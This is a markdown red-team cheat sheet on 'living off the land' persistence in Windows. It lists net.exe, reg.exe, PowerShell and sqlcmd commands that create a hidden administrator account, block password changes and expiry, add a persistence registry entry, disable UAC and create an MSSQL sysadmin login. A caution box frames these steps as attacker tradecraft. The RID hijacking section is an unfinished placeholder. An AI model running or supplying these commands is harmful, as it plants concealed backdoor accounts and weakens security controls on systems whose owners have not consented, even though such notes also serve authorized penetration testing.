# Living off the Land

## 01 - Create Local User

> [!CAUTION] OPSEC Consideration
> Normally you wouldn't create an account since it is intrusive but hackers had to avoid writing malware on disk as much as possible. Choose your decisions wisely.

### 1.1 - Command Prompt

```
C:\> net.exe user sysadmin s3cur3d+1T /add /y

C:\> net.exe localgroup Administrators sysadmin /add /y
```

Makes the user account invisible from the Windows Login screen

```
C:\> reg.exe add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v sysadmin /t REG_DWORD /d 0 /f
```

Sometimes it's a bit annoying when losing access that somebody changed the password whatever if it's on purpose or accidental. This `/passwordchg:<YES | NO>` option will prevent it from happening.

```
C:\> net.exe user sysadmin /passwordchg:no
```

Never expire the password (this command is intrusive so be careful)

```
C:\> net.exe accounts /maxpwage:unlimited
```

Persistence method to add user account

```
C:\> reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v MS_BACKUP /t REG_DWORD /d 0 /f
```

Disabling UAC that allows the hacker to take full control

```
C:\> reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
```

Enabling UAC to make the admin restrictive

```
C:\> reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
```

### 1.2 - PowerShell

```powershell
PS C:\> $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
New-LocalUser -Name sysadmin -Password $password
Add-LocalGroupMember -Groups Administrators -Member "sysadmin"
```

Persistence method to add user account

```
PS C:\> Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name MS_BACKUP -Type DWord -Value 0
```

Disabling UAC that allows the hacker to take full control

```
PS C:\> Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Type DWord -Value 0
```

Enabling UAC to make the admin restrictive

```
PS C:\> Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Type DWord -Value 1
```

### 1.3 - MSSQL

```
C:\> sqlcmd.exe -E [-S <IP>] -U <username> -Q "<query>"
 
1> CREATE LOGIN <username> WITH PASSWORD = '<password>';
2> sp_addsrvrolemember '<username>', 'sysadmin';
3> go
```

## 02 - RID Hijacking

TODO: Fill this heading

---
## References

### LOFLCAB

- [LOFLCAB: reg](https://lofl-project.github.io/loflcab/Binaries/reg/)

- [LOFLCAB: net.exe](https://lofl-project.github.io/loflcab/Binaries/net/)

### Red Team Notes

- [Red Team Notes: RID Hijacking](https://www.ired.team/offensive-security/persistence/rid-hijacking)